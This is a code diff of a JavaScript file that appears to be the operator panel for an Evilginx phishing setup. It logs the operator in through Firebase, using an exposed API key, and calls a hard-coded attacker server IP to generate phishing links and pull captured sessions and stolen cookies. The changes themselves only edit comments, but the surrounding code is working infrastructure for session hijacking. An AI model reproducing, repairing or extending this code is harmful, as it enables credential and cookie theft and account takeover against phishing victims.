@@ -1,6 +1,6 @@
-console.log("Script.js loaded");
+console.log("Script.js loaded correctly");
 
-// ✅ Firebase Configuration
+// ✅ Correct Firebase Configuration (Replace with Your Real Firebase Config)
 const firebaseConfig = {
     apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
     authDomain: "panel-auth-134b7.firebaseapp.com",
@@ -14,10 +14,10 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const auth = firebase.auth();
 
-// ✅ Evilginx API URL
+// ✅ Set Evilginx Server
 const EVILGINX_SERVER = "http://3.149.242.245:5000";
 
-// 🔹 Ensure event listeners are correctly added
+// ✅ Ensure event listeners are correctly added
 document.addEventListener("DOMContentLoaded", function () {
     document.getElementById("loginBtn")?.addEventListener("click", login);
     document.getElementById("logoutBtn")?.addEventListener("click", logout);
@@ -26,7 +26,7 @@ document.addEventListener("DOMContentLoaded", function () {
     document.getElementById("fetchCookiesBtn")?.addEventListener("click", fetchCookies);
 });
 
-// 🔹 LOGIN FUNCTION
+// 🔹 LOGIN FUNCTION (Fixed)
 function login() {
     let email = document.getElementById("email").value;
     let password = document.getElementById("password").value;
@@ -39,21 +39,21 @@ function login() {
     auth.signInWithEmailAndPassword(email, password)
         .then(() => {
             console.log("Login successful!");
-            window.location.href = "dashboard.html";
+            window.location.href = "dashboard.html"; // ✅ Redirect to dashboard
         })
         .catch(error => {
             alert("Login failed: " + error.message);
         });
 }
 
-// 🔹 LOGOUT FUNCTION
+// 🔹 LOGOUT FUNCTION (Fixed)
 function logout() {
     auth.signOut().then(() => {
         window.location.href = "index.html";
     });
 }
 
-// 🔹 GENERATE LINK FUNCTION
+// 🔹 GENERATE LINK FUNCTION (Fixed)
 function generateLink() {
     fetch(`${EVILGINX_SERVER}/generate_link`, {
         method: "POST",
@@ -70,7 +70,7 @@ function generateLink() {
     .catch(error => console.error("Error generating link:", error));
 }
 
-// 🔹 FETCH CAPTURED SESSIONS
+// 🔹 FETCH CAPTURED SESSIONS (Fixed)
 function fetchCapturedSessions() {
     fetch(`${EVILGINX_SERVER}/sessions`)
     .then(response => response.json())
@@ -86,7 +86,7 @@ function fetchCapturedSessions() {
     .catch(error => console.error("Error fetching sessions:", error));
 }
 
-// 🔹 FETCH COOKIES FUNCTION
+// 🔹 FETCH COOKIES FUNCTION (Fixed)
 function fetchCookies() {
     fetch(`${EVILGINX_SERVER}/cookies`)
     .then(response => response.json())
